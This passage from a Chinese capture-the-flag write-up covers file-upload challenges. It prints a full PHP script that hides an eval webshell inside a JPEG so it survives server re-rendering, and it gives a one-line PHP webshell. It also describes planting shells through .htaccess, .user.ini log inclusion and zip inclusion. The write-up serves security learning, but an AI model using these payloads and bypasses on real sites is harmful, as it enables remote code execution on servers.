class="variable">$ret</span>);</span><br></pre></td></tr></table></figure>
+<p>在里面可以看到<code>imagecreatefrompng</code>函数，该函数可以由一个文件创造新的png图片<br>成功后返回图象对象,失败后返回 <strong>false</strong>。<br><code>imagepng</code>函数可以 以 PNG 格式将图像输出到浏览器或文件，也就是把图片解析出来<br>这就是PNG图片二次渲染的步骤</p>
+<h2 id="Web165（JPG图片二次渲染）"><a href="#Web165（JPG图片二次渲染）" class="headerlink" title="Web165（JPG图片二次渲染）"></a>Web165（JPG图片二次渲染）</h2><p>题目逐渐走样，这次上传png正常图片无效<br>上传jpg正常图片有效，抓个包后发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663573515054-e356aa13-faa0-4607-840a-233a4c40d596.png#averageHue=%23f7f7f7&clientId=u444fc0f9-fe6f-4&from=paste&height=433&id=u5bc8030a&name=image.png&originHeight=541&originWidth=1293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100942&status=done&style=none&taskId=u115f8785-3ca9-4fff-8fe3-c697da0c2bd&title=&width=1034.4" alt="image.png"><br>可以看到有个ATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality<br>这是JPG二次渲染的痕迹，说明这一题是JPG二次渲染<br>面对这样的基霸题，还是用大佬的脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=eval(\$_POST[7]);?&gt;&quot;</span>; <span class="comment">//注意$转义</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>用这个脚本去渲染你的JPG图片<br>注意：这里我们要渲染的JPG文件，首先应该上传至网站，然后再网站的上传路径，再次下载，这样做的目的是使得我们用脚本渲染时，改动的地方尽量缩小，使得我们的木马可以更大可能的保留</p>
+<p>之后直接<code>php 脚本.php 你的图片</code>，最后会生成一个payload_你的图片，我们上传脚本跑出来的图片，抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663573744842-82607518-5b1c-4119-b652-5a818a1be45e.png#averageHue=%23f5f5f5&clientId=u444fc0f9-fe6f-4&from=paste&height=589&id=u1e19bbee&name=image.png&originHeight=736&originWidth=1282&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124442&status=done&style=none&taskId=u9d5126c3-6f9f-453e-95bf-92dfdccea56&title=&width=1025.6" alt="image.png"><br>得到了回显，接下来蚁剑直连即可：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663573766995-73bb87c2-7368-4201-b3a7-d7d06848328f.png#averageHue=%23f9f9f9&clientId=u444fc0f9-fe6f-4&from=paste&height=567&id=u81d9239d&name=image.png&originHeight=709&originWidth=990&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58295&status=done&style=none&taskId=uc653fdac-350a-4b74-9bf2-ee57e085555&title=&width=792" alt="image.png"></p>
+<h2 id="Web166（ZIP）"><a href="#Web166（ZIP）" class="headerlink" title="Web166（ZIP）"></a>Web166（ZIP）</h2><p>发现无法上传图片文件，点开网页源码查看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663646798937-9d80f895-7fe3-49f7-b3a1-c025c48146b3.png#averageHue=%23fcfcfb&clientId=u848a604f-2849-4&from=paste&height=62&id=u365b5880&name=image.png&originHeight=78&originWidth=951&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4563&status=done&style=none&taskId=u38980286-2b45-41aa-a4fd-ebd28d61b8b&title=&width=760.8" alt="image.png"><br>要上传压缩包，上传之后会进入下载页面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663646840792-ee184ba6-65e5-4c5c-aef0-b458a716b655.png#averageHue=%23d8b078&clientId=u848a604f-2849-4&from=paste&height=201&id=ubecea83b&name=image.png&originHeight=251&originWidth=1909&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81883&status=done&style=none&taskId=u891a3dcb-10c4-4fb4-8592-085bb2fd1de&title=&width=1527.2" alt="image.png"><br>这应该是被文件包含了，我们直接在压缩包文件尾部写上一句话木马，然后用蚁剑上号</p>
+<h2 id="Web167（-htaccess利用）"><a href="#Web167（-htaccess利用）" class="headerlink" title="Web167（.htaccess利用）"></a>Web167（.htaccess利用）</h2><p>进入页面查看源码后会发现只让上传JPG文件，正常上传一个后：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663648833301-86b0db2a-98cd-4876-9ab2-02654c54f1a5.png#averageHue=%233d3f3e&clientId=u8f8758d4-f352-4&from=paste&height=798&id=uacc0bfff&name=image.png&originHeight=998&originWidth=1860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1096426&status=done&style=none&taskId=u31d11761-846b-420a-b113-32ba4e40030&title=&width=1488" alt="image.png"><br>会显示出来，这里为了看看是不是二次渲染，我这张图片加了一句话木马，然后把他下载下来，发现一句话木马仍然在，说明没有二次渲染</p>
+<p>这道题只是没有解析我们的jpg图片，得想办法解析这个文件，BURPSUITE先抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663648926165-356a9db3-9f9b-479d-8ae3-46bcf0117674.png#averageHue=%23f8f7f7&clientId=u4b960a18-236e-4&from=paste&height=486&id=u839a05d7&name=image.png&originHeight=608&originWidth=1319&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96678&status=done&style=none&taskId=u845b21c8-73c0-4dce-8d21-a233568b5c1&title=&width=1055.2" alt="image.png"><br>上传.htaccess文件发现可行，之后再次访问该图片：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663648950431-dde9e1f1-fffc-4571-b2ea-11afc4cb1e1e.png#averageHue=%23dcd7d2&clientId=u4b960a18-236e-4&from=paste&height=560&id=u0974ff7a&name=image.png&originHeight=700&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=205348&status=done&style=none&taskId=u1bb45136-d859-47ab-b393-553c9d2e245&title=&width=1536" alt="image.png"><br>已经给解析了，蚁剑上号</p>
+<h2 id="Web168（基础免杀）"><a href="#Web168（基础免杀）" class="headerlink" title="Web168（基础免杀）"></a>Web168（基础免杀）</h2><p>进入网页提示上传png格式文件，上传一个图片马上去，发现里面有些内容被ban了无法正常上传<br>发现居然可以上传php文件，那我们不就直接构造1.php文件<br>经过测试发现是ban了eval,system等一系列函数<br>我们首先使用var_dump(scandir(‘.’))去查看当前目录的文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663655502666-5ab687f2-5b6d-41ce-b2f3-25a8959027f0.png#averageHue=%23f5f5f5&clientId=u1fa190f6-c7e8-4&from=paste&height=172&id=ua61c86bd&name=image.png&originHeight=215&originWidth=312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4567&status=done&style=none&taskId=u1a48bc6d-76c4-4ebb-aeec-a9931474b9f&title=&width=249.6" alt="image.png"><br>发现什么也没有，查看..&#x2F;发现有flag和flagaa文件，盲猜flagaa是真的。<br>include被ban了，用show_source(‘..&#x2F;flagaa.php’)去读取flag文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663655556342-61678bb1-754b-4b74-8b7c-b4efa07b3e56.png#averageHue=%23fdfaf9&clientId=u1fa190f6-c7e8-4&from=paste&height=345&id=ubb795d1f&name=image.png&originHeight=431&originWidth=724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11800&status=done&style=none&taskId=ud1cd565a-536e-418c-8ca5-c197837c595&title=&width=579.2" alt="image.png"><br>payload2：<br>使用<code>&lt;?php $_REQUEST[0]($_REQUEST[1]);?&gt;</code>写进1.php之后访问</p>
+<h2 id="Web169（包含日志）"><a href="#Web169（包含日志）" class="headerlink" title="Web169（包含日志）"></a>Web169（包含日志）</h2><p>前端提示上传zip文件，可以上传一个正常zip文件，或者改一下前端代码，之后burpsuite抓包，发现验证的是MIME类型的PNG,对后缀名没什么要求，上传.user.ini：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663656519725-985febff-6b66-4d0e-93a7-6d3baf2d16af.png#averageHue=%23f8f8f8&clientId=u1fa190f6-c7e8-4&from=paste&height=367&id=u8f702aa3&name=image.png&originHeight=459&originWidth=1180&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75930&status=done&style=none&taskId=ue150d92c-9855-433c-86c1-b1d6ff5bc6a&title=&width=944" alt="image.png"><br>因为触发user.ini需要访问php文件，再上传一个1.php，内容随便写什么，空的都可以<br>之后访问url+&#x2F;upload&#x2F;1.php后就会发现我们的日志文件被包含了<br>在user-agent里写入一句话木马，蚁剑上号：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663656579030-c2b03f8f-9e74-48a0-ba64-5486ebf32155.png#averageHue=%23fcfbfa&clientId=u1fa190f6-c7e8-4&from=paste&height=563&id=ue1302e3b&name=image.png&originHeight=704&originWidth=1245&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85217&status=done&style=none&taskId=ub666e731-3924-43b6-95ec-f2e4fc761c6&title=&width=996" alt="image.png"><br>窥探一眼源代码</p>
+<h2 id="Web170（同上）"><a href="#Web170（同上）" class="headerlink" title="Web170（同上）"></a>Web170（同上）</h2><p>结束</p>
+<h2 id="Uploader（Hnusec）"><a href="#Uploader（Hnusec）" class="headerlink" title="Uploader（Hnusec）"></a>Uploader（Hnusec）</h2><p>正如其名，鉴定为文件上传类型的<br>进入页面先要让我们登入一个账号，随便登入一个进去:<br>到达了文件上传界面，这里我上传了个假的png图片，但是被识别掉了，说明这个识别的是文件头<br>所以我上传了一个一句话木马带png文件头的php文件：<br>上传成功，点进源代码查看：<br>发现后缀名又被改成了png！这里也尝试了双写绕过，发现代码是将整个后缀名直接变成png<br>也尝试了burp改包，但是发送过去后不会有回显，黔驴技穷的时候看到了个东西：<br>好家伙躲这里呢，这是一个提示文件，直接URL&#x2F;hint.zip下载查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> if ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 200000) &#123;</span><br><span class="line">   error(&#x27;Uploaded file is too large.&#x27;);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> // check file type</span><br><span class="line"> $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line"> $type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line"> finfo_close($finfo);</span><br><span class="line"> if (!in_array($type, [&#x27;image/png&#x27;])) &#123;</span><br><span class="line">   error(&#x27;Uploaded file is not PNG format.&#x27;);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> // check file width/height</span><br><span class="line"> $size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line"> if ($size[0] &gt; 250 || $size[1] &gt; 250) &#123;</span><br><span class="line">   error(&#x27;Uploaded image is too large.&#x27;);</span><br><span class="line"> &#125;</span><br><span class="line"> if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">   error(&#x27;What happened...? OK, the flag  is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>这是文件内容，这里有很多陌生的函数不过问题不大</p>
+<ul>
+<li>in_array:查看字符串中是否包括某字符</li>
+<li>finfio_open:打开文件</li>
+<li>finfo_file():返回一个文件的信息（finfo_open函数主要是检查十六进制的第一行信息）</li>
+<li>Getimagesize()：是PHP提供的方法，用以判断目标文件是否为图片。其返回结果中有文件大小和文件类型（通过读取文件的前八位的十六进制）。</li>
+</ul>
